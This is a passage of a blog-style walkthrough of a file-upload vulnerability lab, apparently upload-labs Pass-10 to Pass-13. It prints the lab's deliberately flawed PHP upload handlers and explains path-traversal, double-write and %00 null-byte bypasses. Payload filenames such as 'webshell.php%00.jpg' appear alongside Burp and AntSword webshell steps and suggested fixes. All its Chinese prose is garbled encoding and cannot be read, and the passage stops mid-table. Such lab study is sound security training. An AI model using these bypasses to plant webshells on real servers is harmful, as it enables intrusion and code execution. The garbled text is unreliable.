<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<span class="hljs-comment">//æ‹¼æ¥ä¸Šä¼ è·¯å¾„å’Œæ–‡ä»¶å</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<span class="hljs-comment">//å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span><br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ‹¼æ¥è·¯å¾„åŸç†è§£é‡Šï¼š</strong></p><p><strong>ä¸¾ä¸ªç”Ÿæ´»åŒ–çš„ä¾‹å­ï¼š</strong></p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ªå¿«é€’æŸœï¼ˆä¸Šä¼ ç›®å½•ï¼‰ï¼Œåœ°å€æ˜¯ <code>/å°åŒºA/3å·æ¥¼/å¿«é€’æŸœ/</code>ã€‚<br>ä½ è§„å®šæ‰€æœ‰å¿«é€’å¿…é¡»æ”¾è¿›è¿™ä¸ªæŸœå­é‡Œã€‚</p><p>ä½†æ”»å‡»è€…è€äº†ä¸ªèŠ±æ‹›ï¼š<br>ä»–ä»¬åœ¨å¿«é€’å•ä¸Šå†™ <code>../../å°åŒºå¤§é—¨/ä¿å®‰å®¤/å±é™©åŒ…è£¹</code>ã€‚<br>å¿«é€’å‘˜ï¼ˆä»£ç ï¼‰çœ‹åˆ°è¿™ä¸ªåœ°å€åï¼Œä¼šè¿™æ ·æ‹¼æ¥è·¯å¾„ï¼š<code>/å°åŒºA/3å·æ¥¼/å¿«é€’æŸœ/../../å°åŒºå¤§é—¨/ä¿å®‰å®¤/å±é™©åŒ…è£¹</code></p><p>è¿™é‡Œçš„ <code>../</code> ç›¸å½“äºâ€œåé€€ä¸€æ­¥â€ï¼š</p><ol><li>ä» <code>å¿«é€’æŸœ</code> é€€åˆ° <code>3å·æ¥¼</code>ï¼ˆè·¯å¾„å˜æˆ <code>/å°åŒºA/3å·æ¥¼/</code>ï¼‰</li><li>å†é€€åˆ° <code>å°åŒºA</code>ï¼ˆè·¯å¾„å˜æˆ <code>/å°åŒºA/</code>ï¼‰</li><li>æœ€åæ‹¼ä¸Š <code>å°åŒºå¤§é—¨/ä¿å®‰å®¤/å±é™©åŒ…è£¹</code>ï¼Œç»“æœå°±æ˜¯ï¼š<br><code>/å°åŒºA/å°åŒºå¤§é—¨/ä¿å®‰å®¤/å±é™©åŒ…è£¹</code></li></ol><p>äºæ˜¯ï¼Œæ”»å‡»è€…çš„å±é™©åŒ…è£¹è¢«æ”¾åˆ°äº†ä¿å®‰å®¤ï¼ˆæ•æ„Ÿç›®å½•ï¼‰ï¼Œè€Œä¸æ˜¯å¿«é€’æŸœï¼</p><hr><p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§é—®é¢˜ï¼Ÿ</strong></p><ol><li><strong>ä»£ç çš„è·¯å¾„æ‹¼æ¥é€»è¾‘</strong>ï¼š<br>ä½ çš„ä»£ç ç›´æ¥ä¿¡ä»»ç”¨æˆ·è¾“å…¥çš„æ–‡ä»¶åï¼ŒæŠŠä¸Šä¼ ç›®å½•ï¼ˆ<code>UPLOAD_PATH</code>ï¼‰å’Œæ–‡ä»¶åï¼ˆ<code>$file_name</code>ï¼‰æ‹¼åœ¨ä¸€èµ·ã€‚<br>å¦‚æœæ–‡ä»¶åé‡Œè—äº† <code>../</code>ï¼Œè·¯å¾„å°±ä¼šè¢«â€œç»•â€åˆ°å…¶ä»–ç›®å½•ã€‚</li><li><strong>æ“ä½œç³»ç»Ÿå¯¹è·¯å¾„çš„è§£æ</strong>ï¼š<br>æ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨è§£æ <code>../</code>ï¼ŒæŠŠå®ƒå½“æˆâ€œè¿”å›ä¸Šçº§ç›®å½•â€çš„æŒ‡ä»¤ã€‚<br>æ¯”å¦‚ï¼š<br><code>/var/www/uploads/../../</code> â†’ å®é™…ä¸Šç­‰äº <code>/var/</code>ï¼ˆé€€äº†ä¸¤å±‚ï¼‰</li></ol><hr><p><strong>æ”»å‡»è€…ä¼šåšä»€ä¹ˆï¼Ÿ</strong></p><p>å‡è®¾ä½ çš„ç½‘ç«™æ ¹ç›®å½•æ˜¯ <code>/var/www/html/</code>ï¼Œæ”»å‡»è€…å¯èƒ½ï¼š</p><ol><li>ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å <code>../../html/shell.php</code></li><li>ä½ çš„ä»£ç æ‹¼æ¥åè·¯å¾„å˜æˆï¼š<br><code>/var/www/uploads/../../html/shell.php</code> â†’ å®é™…æ˜¯ <code>/var/www/html/shell.php</code></li><li>æ”»å‡»è€…é€šè¿‡è®¿é—® <code>http://ä½ çš„ç½‘ç«™.com/shell.php</code>ï¼Œå°±èƒ½æ‰§è¡Œä»»æ„ä»£ç ï¼ˆæ¯”å¦‚åˆ é™¤æ•°æ®åº“ã€çªƒå–æ•°æ®ï¼‰ã€‚</li></ol><hr><p><strong>å¦‚ä½•å½»åº•è§£å†³ï¼Ÿ</strong></p><ol><li><strong>ç¦æ­¢æ–‡ä»¶åä¸­å‡ºç°è·¯å¾„ç¬¦å·</strong>ï¼š<br>ç”¨ <code>basename()</code> å‡½æ•°ï¼Œç›´æ¥ç æ‰æ‰€æœ‰è·¯å¾„éƒ¨åˆ†ï¼Œåªä¿ç•™çº¯æ–‡ä»¶åã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">// æ— è®ºç”¨æˆ·è¾“å…¥ä»€ä¹ˆè·¯å¾„ï¼Œåªå–æœ€åçš„æ–‡ä»¶å</span><br></code></pre></td></tr></table></figure><p><strong>æ•ˆæœ</strong>ï¼š</p><pre><code class="hljs">- ç”¨æˆ·è¾“å…¥ `../../evil.php` â†’ å¤„ç†åå˜æˆ `evil.php`- è·¯å¾„å›ºå®šä¸º `UPLOAD_PATH/evil.php`</code></pre><ol start="2"><li><strong>å¼ºåˆ¶ç™½åå•æ–‡ä»¶ç±»å‹</strong>ï¼š<br>åªå…è®¸å›¾ç‰‡ç­‰å®‰å…¨ç±»å‹ï¼ˆæ¯”å¦‚ <code>.jpg</code>, <code>.png</code>ï¼‰ï¼Œç¦æ­¢ <code>.php</code> ç­‰å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$allow_ext</span> = [<span class="hljs-string">&#x27;.jpg&#x27;</span>, <span class="hljs-string">&#x27;.png&#x27;</span>, <span class="hljs-string">&#x27;.gif&#x27;</span>]; <span class="hljs-comment">// åªå…è®¸è¿™äº›æ‰©å±•å</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allow_ext</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ç¦æ­¢ä¸Šä¼ ï¼&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li><strong>é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶</strong>ï¼š<br>ç”¨éšæœºå­—ç¬¦ä¸²é‡å‘½åæ–‡ä»¶ï¼ˆå¦‚ <code>5f3d2a1.jpg</code>ï¼‰ï¼Œè®©æ”»å‡»è€…æ— æ³•é¢„æµ‹æ–‡ä»¶è·¯å¾„ã€‚</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$new_name</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>()) . <span class="hljs-variable">$file_ext</span>; <span class="hljs-comment">// ç”Ÿæˆéšæœºæ–‡ä»¶å</span><br><span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$new_name</span>;<br></code></pre></td></tr></table></figure><p>æ‹¼æ¥è·¯å¾„ï¼Œåœ¨æ–‡ä»¶åç§°åé¢åŠ å…¥<code>. .</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938448.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938522.png"></p><h3 id="Pass-11-åŒå†™ç»•è¿‡"><a href="#Pass-11-åŒå†™ç»•è¿‡" class="headerlink" title="Pass-11_åŒå†™ç»•è¿‡"></a>Pass-11_åŒå†™ç»•è¿‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>str_ireplace å‡½æ•°æ˜¯ PHP ä¸­çš„ä¸€ä¸ªä¸åŒºåˆ†å¤§å°å†™çš„å­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°ã€‚å®ƒç”¨äºåœ¨ç»™å®šçš„å­—ç¬¦ä¸²ï¼ˆæˆ–å­—ç¬¦ä¸²æ•°ç»„ï¼‰ä¸­ï¼Œå°†æ‰€æœ‰åŒ¹é…çš„æœç´¢å­—ç¬¦ä¸²æ›¿æ¢ä¸ºæŒ‡å®šçš„æ›¿æ¢å­—ç¬¦ä¸²ï¼Œä¸”ä¸åŒºåˆ†å¤§å°å†™ã€‚</p><p>åœ¨è¿™ä¸ªä»£ç ä¸­ï¼Œä¼šå°†é»‘åå•é‡Œçš„æ–‡ä»¶åå…¨éƒ¨æ›¿æ¢ä¸ºç©ºï¼Œä½†åªæ›¿æ¢ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥ç”¨åŒå†™ç»•è¿‡ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938525.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943892.png"></p><h3 id="Pass-12-00æˆªæ–­ç»•è¿‡ï¼ˆPOSTï¼‰"><a href="#Pass-12-00æˆªæ–­ç»•è¿‡ï¼ˆPOSTï¼‰" class="headerlink" title="Pass-12_00æˆªæ–­ç»•è¿‡ï¼ˆPOSTï¼‰"></a>Pass-12_00æˆªæ–­ç»•è¿‡ï¼ˆPOSTï¼‰</h3><p>ç¬¬12å…³å¼€å§‹è¿›å…¥ç™½åå•</p><p>å‰ææ¡ä»¶ï¼š</p><p>1.phpç‰ˆæœ¬å°äº5.3</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943167.png"></p><p>2.é…ç½®æ–‡ä»¶ä¸­<code>php.ini</code>ä¸­çš„<code>magic_quotes_gpc = On</code>éœ€è¦ä¿®æ”¹ä¸º<code>magic_quotes_gpc = Off</code>ï¼Œ<strong>ä¿®æ”¹ä¹‹åè®°å¾—ä¿å­˜å¹¶é‡å¯</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943579.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>00æˆªæ–­åŸç†ï¼š</strong></p><p>å…³é”®ä½¿ç”¨äº†ç©ºå­—ç¬¦</p><p>åœ¨urlç¼–ç ä¸­ç©ºå­—ç¬¦ä¸º<code>%00</code></p><p>å½“ä¼ å…¥æ–‡ä»¶æ—¶ï¼Œç”¨ç©ºå­—ç¬¦æˆªæ–­æ–‡ä»¶åå˜æˆæ”»å‡»æ€§æ–‡ä»¶</p><p>ä¾‹å¦‚ï¼šä¸Šä¼ <code>example.php%00.jpg</code> ååœ¨ URL è§£ç åä¼šå˜æˆ <code>example.php\0.jpg</code>ï¼Œå½“ç³»ç»Ÿå¤„ç†æ—¶<code>example.php\0.jpg</code> ä¼šè¢«æ–‡ä»¶ç³»ç»Ÿä¿å­˜ä¸º <code>example.php</code>ï¼Œä»è€Œè¾¾æˆç›®çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944287.png"></p><p>è¿›è¡Œæ›´æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944140.png"></p><p>ä¸Šä¼ æˆåŠŸåå¤åˆ¶é“¾æ¥åˆ°èšå‰‘</p><p>å°†%ä¹‹åçš„å»é™¤</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944986.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944368.png"></p><h3 id="Pass-13-00æˆªæ–­ç»•è¿‡ï¼ˆGET"><a href="#Pass-13-00æˆªæ–­ç»•è¿‡ï¼ˆGET" class="headerlink" title="Pass-13_00æˆªæ–­ç»•è¿‡ï¼ˆGET)"></a>Pass-13_00æˆªæ–­ç»•è¿‡ï¼ˆGET)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>ä»£ç æ¼æ´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>strrpos</code>æŸ¥æ‰¾æ–‡ä»¶åä¸­çš„æœ€åä¸€ä¸ª<code>.</code>çš„ä½ç½®æ¥è·å–æ–‡ä»¶æ‹“å±•å</p><p>é‚£ä¹ˆæˆ‘ä»¬å°†æ–‡ä»¶åæ„é€ ä¸º <code>webshell.php .jpg</code>ï¼ˆæ³¨æ„ä¸­é—´çš„ç©ºæ ¼ï¼‰ï¼Œç„¶ååœ¨åå…­è¿›åˆ¶ï¼ˆHEXï¼‰è§†å›¾ä¸­å°†ç©ºæ ¼ï¼ˆASCII <code>20</code>ï¼‰æ”¹ä¸ºç©ºå­—èŠ‚ï¼ˆHEX <code>00</code>ï¼‰ã€‚æœ€ç»ˆæ–‡ä»¶åå˜ä¸º <code>webshell.php\x00.jpg</code>ï¼ˆ<code>\x00</code> è¡¨ç¤ºç©ºå­—èŠ‚ï¼‰ã€‚</p><p>å¹¶ä¸”ç”±äº PHP åœ¨åº•å±‚ä½¿ç”¨ C å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œå½“é‡åˆ°ç©ºå­—èŠ‚ <code>\x00</code> æ—¶ï¼Œ<code>strrpos</code> ä¼šè®¤ä¸ºå­—ç¬¦ä¸²åœ¨ <code>\x00</code> å¤„ç»“æŸã€‚</p><p>å› æ­¤ï¼ŒåŸå§‹æ–‡ä»¶å <code>webshell.php\x00.jpg</code> ä¼šè¢«æˆªæ–­ä¸º <code>webshell.php</code>ã€‚</p><p>bpæŠ“åŒ…ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944333.png"></p><p>åœ¨uploadåæ·»åŠ æ–‡ä»¶å<code>webshell.php</code>å¹¶ä¸”åœ¨æ­¤æ–‡ä»¶ååæ·»åŠ ç©ºæ ¼ï¼Œé€‰ä¸­ç©ºæ ¼åï¼Œåœ¨å³è¾¹çš„çª—å£å°†ç©ºæ ¼çš„HAXå€¼ï¼ˆ20ï¼‰æ”¹ä¸ºç©ºå­—ç¬¦çš„HAXå€¼ï¼ˆ00ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944248.png"></p><p>å°†æ–‡ä»¶åç¼€åæ”¹ä¸ºç™½åå•ä¸Šçš„</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944699.png"></p><p>ä¸Šä¼ æˆåŠŸåå¤åˆ¶é“¾æ¥åˆ°èšå‰‘ï¼Œåˆ é™¤%ä»¥åŠåè¾¹çš„ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944193.png"></p><p>è¿æ¥æˆåŠŸ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944440.png"></p><p><strong>å¯¹æ¯” GET å’Œ POST åœ¨ 00 æˆªæ–­ç»•è¿‡ä¸­çš„åŒºåˆ«</strong></p><table><thead><tr><th align="left"><strong>å¯¹æ¯”é¡¹</strong></th><th align="center"><strong>GET è¯·æ±‚</strong></th><th align="center"><strong>POST è¯·æ±‚</strong></th></tr></thead><tbody><tr><td align="left"><strong>å‚æ•°ä½ç½®</strong></td><td align="center">å‚æ•°é™„åŠ åœ¨ URL ä¸­ï¼ˆå¦‚ <code>?file=test.php%00.jpg</code>ï¼‰ã€‚</td><td align="center">å‚æ•°åœ¨ HTTP 